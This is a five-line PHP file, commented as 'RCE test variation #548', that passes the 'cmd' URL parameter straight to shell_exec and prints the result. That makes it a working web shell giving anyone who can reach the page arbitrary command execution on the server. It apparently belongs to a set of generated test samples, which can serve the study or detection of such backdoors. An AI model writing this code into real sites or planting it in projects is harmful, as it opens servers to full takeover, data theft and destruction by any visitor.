<?php
// RCE test variation #548
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>